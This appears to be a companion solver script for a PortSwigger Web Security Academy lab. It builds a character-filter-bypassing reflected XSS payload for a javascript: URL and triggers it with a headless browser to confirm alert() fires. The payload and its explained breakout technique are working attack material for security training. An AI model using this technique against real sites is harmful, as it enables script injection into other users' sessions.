#!/usr/bin/env python3
"""
Reflected XSS in a JavaScript URL with some characters blocked
PortSwigger Web Security Academy -- Cross-Site Scripting (XSS)

Companion script for the writeup: 28-reflected-xss-javascript-url-chars-blocked.md

What this does:
    The "Back to Blog" link is built as javascript:fetch('/analytics?endpoint=PARAM'),
    with PARAM reflecting a URL parameter into the fetch() argument. Spaces (and
    several other characters) are blocked, which rules out a plain
    '),alert(1),(' breakout. The payload closes the fetch() call, defines an
    arrow function that -- via the comma operator -- sets onerror=alert and then
    throw 1337 (throw is a statement, so it's wrapped in an arrow function body
    to make it usable as an expression), assigns that function to window's
    toString, and forces window+'' to trigger implicit string coercion, which
    invokes toString(), which throws, delivering 1337 into the onerror-assigned
    alert. /**/ substitutes for the blocked space character between tokens.
    The alert only fires on navigation, so a headless browser clicks the
    "Back to Blog" link to trigger the javascript: URL.

Usage:
    python 28-reflected-xss-javascript-url-chars-blocked.py <lab-url>
    e.g. python 28-reflected-xss-javascript-url-chars-blocked.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx playwright
    playwright install chromium
"""

import sys
import httpx

try:
    from playwright.sync_api import sync_playwright
except ImportError:
    sync_playwright = None


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)
    warmup = client.get(lab_url)
    session = warmup.cookies.get("session", "")
    domain = lab_url.split("/")[2]

    # Literal payload for reference: '},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
    inject = "%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27"
    xss_url = f"{lab_url}/post?postId=5&{inject}"
    print(f"[*] Target URL: {xss_url}")

    if sync_playwright is None:
        print("[!] playwright not installed -- cannot confirm alert() execution.")
        print(f"    Install it, or open this URL yourself and click 'Back to Blog': {xss_url}")
        return

    alert_fired = False
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        ctx = browser.new_context()
        if session:
            ctx.add_cookies([{"name": "session", "value": session, "domain": domain, "path": "/"}])
        page = ctx.new_page()

        def on_dialog(dialog):
            nonlocal alert_fired
            alert_fired = True
            dialog.accept()

        page.on("dialog", on_dialog)
        try:
            page.goto(xss_url, wait_until="domcontentloaded", timeout=15000)
            page.wait_for_timeout(1000)
            page.click("text=Back to Blog", timeout=5000)
            page.wait_for_timeout(2000)
        except Exception as e:
            print(f"[*] Browser exception (expected -- navigation via javascript: URL): {type(e).__name__}")
        browser.close()

    print(f"[{'+' if alert_fired else '-'}] alert() fired: {alert_fired}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
